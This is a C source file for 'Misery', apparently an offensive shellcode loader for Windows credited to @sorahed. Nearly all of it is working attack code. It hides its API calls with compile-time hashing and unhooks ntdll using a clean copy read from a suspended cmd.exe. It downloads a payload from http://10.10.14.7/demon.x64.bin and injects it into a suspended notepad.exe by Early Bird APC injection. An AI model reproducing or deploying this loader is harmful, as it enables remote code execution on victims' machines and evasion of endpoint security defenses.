/*

Author: Sorahed

-> Misery is a code injector with some features
   
   -> Unhook NTDLL from suspended process
   -> Early Bird Injection
   -> Sandbox bypass(Api Hammering)
   -> Anti Analysis Functions
   -> API Hashing with HashStringJenkins

*/

#include <windows.h>
#include <stdio.h>
#include <winternl.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#include <psapi.h>
#include <wininet.h>

#include "Common.h"
#include "TypeDef.h"

#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "Wininet.lib")

#define SystemProcessInformation 5

#define AUTHOR "@sorahed"
#define VERSION 1.0
#define SEED 5


void Banner() {
    printf(R"EOF(
        
 _   .-')              .-')      ('-.  _  .-')               
( '.( OO )_           ( OO ).  _(  OO)( \( -O )              
 ,--.   ,--.) ,-.-') (_)---\_)(,------.,------.   ,--.   ,--.
 |   `.'   |  |  |OO)/    _ |  |  .---'|   /`. '   \  `.'  / 
 |         |  |  |  \\  :` `.  |  |    |  /  | | .-')     /  
 |  |'.'|  |  |  |(_/ '..`''.)(|  '--. |  |_.' |(OO  \   /   
 |  |   |  | ,|  |_.'.-._)   \ |  .--' |  .  '.' |   /  /\_  
 |  |   |  |(_|  |   \       / |  `---.|  |\  \  `-./  /.__) 
 `--'   `--'  `--'    `-----'  `------'`--' '--'   `--'      
                    
                    Author: @sorahed
                    Version: 1.0
           
        )EOF");
}


// generate a random key (used as initial hash)
constexpr int RandomCompileTimeSeed(void)
{
    return '0' * -40271 +
        __TIME__[7] * 1 +
        __TIME__[6] * 10 +
        __TIME__[4] * 60 +
        __TIME__[3] * 600 +
        __TIME__[1] * 3600 +
        __TIME__[0] * 36000;
};

constexpr auto g_KEY = RandomCompileTimeSeed() % 0xFF;


// compile time Djb2 hashing function (WIDE)
constexpr DWORD HashStringDjb2W(const wchar_t* String) {
    ULONG Hash = (ULONG)g_KEY;
    INT c = 0;
    while ((c = *String++)) {
        Hash = ((Hash << SEED) + Hash) + c;
    }

    return Hash;
}

// compile time Djb2 hashing function (ASCII)
constexpr DWORD HashStringDjb2A(const char* String) {
    ULONG Hash = (ULONG)g_KEY;
    INT c = 0;
    while ((c = *String++)) {
        Hash = ((Hash << SEED) + Hash) + c;
    }

    return Hash;
}

// runtime hashing macros 
#define RTIME_HASHA( API ) HashStringDjb2A((const char*) API)
#define RTIME_HASHW( API ) HashStringDjb2W((const wchar_t*) API)



// compile time hashing macros (used to create variables)
#define CTIME_HASHA( API ) constexpr auto API##_Rotr32A = HashStringDjb2A((const char*) #API);
#define CTIME_HASHW( API ) constexpr auto API##_Rotr32W = HashStringDjb2W((const wchar_t*) L#API);

FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {

    PBYTE pBase = (PBYTE)hModule;

    PIMAGE_DOS_HEADER			pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
        return NULL;

    PIMAGE_NT_HEADERS			pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        return NULL;

    IMAGE_OPTIONAL_HEADER		ImgOptHdr = pImgNtHdrs->OptionalHeader;

    PIMAGE_EXPORT_DIRECTORY		pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    PDWORD						FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);
    PDWORD						FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
    PWORD						FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {
        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);
        PVOID	pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);

        if (dwApiNameHash == RTIME_HASHA(pFunctionName)) { // runtime hash value check 
            return (FARPROC)pFunctionAddress;
        }
    }

    return NULL;
}

CTIME_HASHA(CreateProcessA)
CTIME_HASHA(ReadProcessMemory)
CTIME_HASHA(VirtualAllocEx)
CTIME_HASHA(VirtualAlloc)
CTIME_HASHA(WriteProcessMemory)
CTIME_HASHA(QueueUserAPC)
CTIME_HASHW(VirtualProtect)


static int UnhookNtdll(const HMODULE hNtdll, const LPVOID pCache) {
    
    /*
        UnhookNtdll() finds fresh "syscall table" of ntdll.dll from suspended process and copies over onto hooked one
    */

    HMODULE hKernel32Module = GetModuleHandleH(KERNEL32_HASH);
    if (hKernel32Module == NULL) {
        printf("[!] Cound'nt get handle to kernel32.dll \n");
        return -1;
    }
    DWORD oldprotect = 0;
    PIMAGE_DOS_HEADER pImgDOSHead = (PIMAGE_DOS_HEADER)pCache;
    PIMAGE_NT_HEADERS pImgNTHead = (PIMAGE_NT_HEADERS)((DWORD_PTR)pCache + pImgDOSHead->e_lfanew);
    int i;

    fnVirtualProtect pVirtualProtect = (fnVirtualProtect)GetProcAddressH(hKernel32Module, VirtualProtect_Rotr32W);

    // Find .text section
    for (i = 0; i < pImgNTHead->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER pImgSectionHead = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pImgNTHead) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

        if (!strcmp((char*)pImgSectionHead->Name, ".text")) {
            // Prepare ntdll.dll memory region for write permissions.
            pVirtualProtect((LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress),
                pImgSectionHead->Misc.VirtualSize,
                PAGE_EXECUTE_READWRITE,
                &oldprotect);
            if (!oldprotect) {
                // RWX failed!
                return -1;
            }

            // Copy clean "syscall table" into ntdll memory
            DWORD SC_start = FindFirstSyscall((char*)pCache, pImgSectionHead->Misc.VirtualSize);
            DWORD SC_end = FindLastSysCall((char*)pCache, pImgSectionHead->Misc.VirtualSize);

            if (SC_start != 0 && SC_end != 0 && SC_start < SC_end) {
                DWORD SC_size = SC_end - SC_start;

                printf("\n[+] Remote First syscall in ntdll : 0x%p\n", ((DWORD_PTR)hNtdll + SC_start));
                printf("[+] Size Remote .Text Section : %i\n", SC_size);
                memcpy((LPVOID)((DWORD_PTR)hNtdll + SC_start),
                    (LPVOID)((DWORD_PTR)pCache + +SC_start),
                    SC_size);
            }

            // Restore original protection settings of ntdll
            pVirtualProtect((LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress),
                pImgSectionHead->Misc.VirtualSize,
                oldprotect,
                &oldprotect);
            if (!oldprotect) {
                // It failed
                return -1;
            }
            return 0;
        }
    }

    return -1;
}

int main(void) {

    int Pid = 0;
    int ret = 0;

    HANDLE hProc = NULL;

    STARTUPINFO si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    
    void* pRemCode;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if (LoadLibraryA("KERNEL32.DLL") == NULL) {
        printf("[!] LoadLibraryA Failed With Error : %d", GetLastError());
        return 0;
    }

    HMODULE hKernel32Module = GetModuleHandleH(KERNEL32_HASH);
    if (hKernel32Module == NULL) {
        printf("[!] Cound'nt get handle to kernel32.dll \n");
        return -1;
    }

    fnCreateProcessA pCreateProcessA = (fnCreateProcessA)GetProcAddressH(hKernel32Module, CreateProcessA_Rotr32A);

    if(!pCreateProcessA(0, (LPSTR)"cmd.exe", 0, 0, FALSE, CREATE_SUSPENDED | CREATE_NEW_CONSOLE, 0, "C:\\Windows\\System32\\", &si, &pi)){
        //printf("[!] CreateProcessA Failed With Error : %d \n", GetLastError());
        return -1;
    }

    // Get the size of ntdll module in memory
    char* pNtdllAddr = (char*)GetModuleHandleH(NTDLL_HASH);
    IMAGE_DOS_HEADER* pDosHdr = (IMAGE_DOS_HEADER*)pNtdllAddr;
    IMAGE_NT_HEADERS* pNTHdr = (IMAGE_NT_HEADERS*)(pNtdllAddr + pDosHdr->e_lfanew);
    IMAGE_OPTIONAL_HEADER* pOptionalHdr = &pNTHdr->OptionalHeader;

    SIZE_T ntdll_size = pOptionalHdr->SizeOfImage;

    // Allocate local buffer to hold temporary copy of clean ntdll from remote process
    fnVirtualAlloc pVirtualAlloc = (fnVirtualAlloc)GetProcAddressH(hKernel32Module, VirtualAlloc_Rotr32A);

    LPVOID pCache = pVirtualAlloc(NULL, ntdll_size, MEM_COMMIT, PAGE_READWRITE);

    SIZE_T bytesRead = 0;

    // Copy the .text section
    fnReadProcessMemory pReadProcessMemory = (fnReadProcessMemory)GetProcAddressH(hKernel32Module, ReadProcessMemory_Rotr32A);

    if (!pReadProcessMemory(pi.hProcess, pNtdllAddr, pCache, ntdll_size, &bytesRead))
        printf("[!] ReadProcessMemory Failed With Error : %d\n", GetLastError());

    Banner();

    LPCWSTR szUrl = L"http://10.10.14.7/demon.x64.bin";
    PBYTE pPayloadBytes = NULL;
    SIZE_T sPayloadSize = 0;

    BOOL bState = (GetPayloadFromUrl(szUrl, &pPayloadBytes, &sPayloadSize));
    
    if(bState){
        printf("\n[!] Successfully downloaded payload : 0x%p \n", pPayloadBytes);
        printf("[+] Size of the Payload : %zu \n", sPayloadSize);

    }
    else {
        printf("\n[!] Please check the url, or the server! \n");
        printf("[!] Example -> blackhat.com/payload.bin \n");
        return -1;
    }

    printf("\n[!] .Text section copied and allocated to : 0x%p \n", pCache);
    printf("[!] Killing The First Process\n");

    TerminateProcess(pi.hProcess, 0);
    
    // Remove hooks
    printf("[!] Unhooking Ntdll\n");
    ret = UnhookNtdll(GetModuleHandleH(NTDLL_HASH), pCache);

    printf("\n[!] Ntdll Unhooked, Enjoy No Hooks Here! \n");
    VirtualFree(pCache, 0, MEM_RELEASE);

    // Spawning second process for injection

    if (!pCreateProcessA(0, (LPSTR)"notepad.exe", 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi)) {
        //printf("[!] CreateProcess Failed With Error : %d \n", GetLastError());
    }
    
    /*
    // Api-Hammering before payload execution
    DWORD T0 = NULL,
        T1 = NULL;
    
    T0 = GetTickCount64();

    if (!ApiHammering(1000)) {
        return -1;
    }

    T1 = GetTickCount64();

    printf("[!] ApiHammering(1000) Took : %d milliseconds to complete \n", (DWORD(T1 - T0)));
    
    */

    // Allocate Memory
    fnVirtualAllocEx pVirtualAllocEx = (fnVirtualAllocEx)GetProcAddressH(hKernel32Module, VirtualAllocEx_Rotr32A);

    pRemCode = pVirtualAllocEx(pi.hProcess, NULL, sPayloadSize, MEM_COMMIT, PAGE_EXECUTE_READ);

    // Write shellcode

    fnWriteProcessMemory pWriteProcessMemory = (fnWriteProcessMemory)GetProcAddressH(hKernel32Module, WriteProcessMemory_Rotr32A);
    if (!pWriteProcessMemory(pi.hProcess, pRemCode, (PVOID)pPayloadBytes, (SIZE_T)sPayloadSize, (SIZE_T*)NULL)) {
        //printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
        return -1;
    }

    fnQueueUserAPC pQueueUserAPC = (fnQueueUserAPC)GetProcAddressH(hKernel32Module, QueueUserAPC_Rotr32A);
    if (!pQueueUserAPC((PAPCFUNC)pRemCode, pi.hThread, NULL)) {
        //printf("[!] QueueUserAPC Failed With Error : %d \n", GetLastError());
        return -1;
    }

    /*
    printf("\n[+] CreateProcessA : 0x%0.8x \n", CreateProcessA_Rotr32A);
    printf("[+] ReadProcessMemory : 0x%0.8x \n", ReadProcessMemory_Rotr32A);
    printf("[+] VirtualProtect : 0x%0.8x \n", VirtualProtect_Rotr32W);
    printf("[+] VirtualAllocEx : 0x%0.8x \n", VirtualAllocEx_Rotr32A);
    printf("[+] WriteVirtualMemory : 0x%0.8x \n", WriteProcessMemory_Rotr32A);
    printf("[+] QueueUserAPC : 0x%0.8x \n", QueueUserAPC_Rotr32A);

    printf("\n[+] Local Payload Address : 0x%p\n", pPayloadBytes);
    printf("[+] Remote Payload Address : 0x%p\n", pRemCode);
    printf("[#] Press <Enter> To Inject Payload ... ");
    getchar();
    */
    ResumeThread(pi.hThread);

    return 0;

}